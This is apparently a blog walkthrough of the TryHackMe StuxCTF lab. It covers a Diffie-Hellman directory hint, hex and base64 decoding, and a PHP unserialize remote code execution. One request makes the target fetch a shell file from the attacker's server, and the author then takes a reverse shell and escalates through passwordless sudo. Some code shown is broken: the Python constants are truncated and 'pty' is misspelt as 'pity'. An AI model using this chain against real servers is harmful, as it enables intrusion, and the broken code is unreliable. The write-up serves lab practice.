## StuxCTF 

You can find the link for the ctf below:
[tryhackme stuxCTF](https://tryhackme.com/room/stuxctf)
![](https://miro.medium.com/v2/resize:fit:640/1*q03Yuq0kOZf2SgFgkv2_hA.png)

StuxCTF is a great machine for beginners which involve cryptography and reverse shell. No more talks, Let’s start from the first step which is information gathering.

First so so basic thing start the machine and then connect to it using **openvpn**.
## NMAP

Use your nmap to find the open ports and the services running on the ports.
![](https://i.imgur.com/bLF18Wa.png)

As we can see here that we are having 2 ports open so lets start first watching the http site that is running on the port no 80.
![](https://i.imgur.com/OXjzS1P.png)

Also one of the common moves is check the source code of the page as well as check the robots.txt file of the server.
![](https://i.imgur.com/bC3Euu1.png)
and for the robots.txt we have this 
![](https://i.imgur.com/gA9irN3.png)
see they gave the direct hint that use **Diffie-Hellman** which is a encrypted way key exchange algorithm.

So before moving on let me give you the sources for understanding this diffie-hellman.
[Diffie-Hellman](https://www.techtarget.com/searchsecurity/definition/Diffie-Hellman-key-exchange)
also the video that i referred is this one:
[Video](https://www.youtube.com/watch?v=M-0qt6tdHzk)
This will give you that how are we using the diffie-Hellman in this CTF.

So first of all we will use python to calculate the final secrect directory that is supposed to be found using the diffie-hellman

the script for the same is as follows:
``` python                               
# Given values
p = 9975298661930085086019708402870402191114171745913160469454315876556947370642799226714405016920875594030192024506376929926694545>
g = 7
a = 330
b = 450
g_c = 60919178008335987415309240817622254774182770101420226227316881582977596213294070709854979170789887814488899470743506942202097>

# Step 1: Compute (g_c^a mod p)
gca = (g_c**a) % p

# Step 2: Compute (g_c^a^b mod p)
gcab = (gca**b) % p

print(str(gcab)[:128])
```
from this you will get the string like this
![](https://i.imgur.com/0rgGmXE.png)

so lets try searching the site with this long string we got.
![](https://i.imgur.com/zpVAX1t.png)
noicee we got to the another step so lets move on with the same method of first checking the source code
![](https://i.imgur.com/mlPU3i2.png)
we got a hint here that here there will be a file that we have to find and get the content of it.
so lets try the basic common.txt list for dirbuster on this site url
```
dirbuster http://10.10.122.185:80/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/
```
you can just do **dirbuster** and then enter the url and all things
![](https://i.imgur.com/ch1XaGm.png)
so the things we found are **index.php** and **assets**
and will try both of them
![](https://i.imgur.com/z7SOrZQ.png)
and this is the string we got in the some format,
let check what does this mean

![](https://i.imgur.com/5Vso3VD.png)

After check few things and few trial and errors i got to know that this is a **hex** and i can covert it to normal form.

So lets use **xxd** if you dont know about it you can go and check what is [xxd](https://linux.die.net/man/1/xxd)
![](https://i.imgur.com/l9kxRNZ.png)
this is the text from the site and we will convert it to normal form.
``` bash
xxd -r -p text.txt > output.txt
```
and the output is as follows:
![](https://i.imgur.com/7ssZPmH.png)
here we got something and u can guess what is it 
and if you ask me it is a **reverse base64** and now lets try to break the string that what is the original message of this.

For that we will be using reverse the string using any language.

Here i am doing it using python script:
``` python
txt = "enter your string here"[::-1]
print(txt)
```
![](https://i.imgur.com/LUKIfTu.png)

and here we get new reversed string and then we will decode that string using the base64 and the command for the same is as follows:
``` bash
cat output2.txt | base64 -d > output3.txt
```
or any online tool to decode and encode from base 64
and the output is as follows:
![](https://i.imgur.com/fMBON9Y.png)
and using the command also we can get
![](https://i.imgur.com/Ui7DYdo.png)
and from this we can see that majority of the code is complete and fine but i got my eye on the **unserialize** function that was called with the file name and so i searched the web and found that it is vulnerable and can be exploited.

I have checked it using **searchsploit** if you dont know what is it you can check it here.
[Searchsploit](https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf)
![](https://i.imgur.com/mAOTq4l.png)
and and and once i get na that this thing is vulnerable i cannot stop myself trying to get that thing exploited😅😅.

so lets get a php one liner and shut the server up with regrets.

you can also download the script from here and then send it to the server and tell that person to execute it for you.
if the person is cooperative 😂😂.

so we will be doing is getting a php 1 line executable script which will do rce and get us a sweet little shell inside of our terminal.

you can get the same from here [RCE for Unserialize](https://notsosecure.com/remote-code-execution-php-unserialize)
and the script we will be using wont be a direct and easy one as we have to give it input like thisss
**/?file=**
which was given as a hint in past

so the code is already given has to get some modifications and the modifications are as follows:
![](https://i.imgur.com/f0shIeC.png)
and the text will be like this:
![](https://i.imgur.com/xpLzxnR.png)
so lets use this text and get a reverse shell
and and and dont forget to start the listening to 4444

Here we will be sending this file as text and using the tunnel ip and port that we have created for reverse shell...
```
/?file=http://10.17.8.41/shell.txt
```
and for that we will be starting a python http server that will send the file to the server.
![](https://i.imgur.com/XaZHz7M.png)
and you can see i have uploaded the file and now we will get the reverse shell
using the name we have used for the file
```
http://10.10.122.185/47315028937264895539131328176684350732577039984023005189203993885687328953804202704977050807800832928198526567069446044422855055/shell.php
```
![](https://i.imgur.com/ztGwxB7.png)
now after getting connected you can get the proper terminal or shell but i m happy with what we get 
```
python -c 'import pity;pity.spawn("/bin/bash");'
```
so i will be working directly
first we will check the user
```
cd /home
```
![](https://i.imgur.com/bxW6cJD.png)
then we will check the stored in it.
![](https://i.imgur.com/lDgowQo.png)
Here we got the user.txt 
now lets check the sudo permission and then we will check the root folder for the root.txt file 
```
sudo -l
```
![](https://i.imgur.com/blu0TWe.png)

and see we dont need any password to get root access
so lets see the txt file in root user
![](https://i.imgur.com/K4BR43e.png)
and donee!!!!.

We have completed the CTF.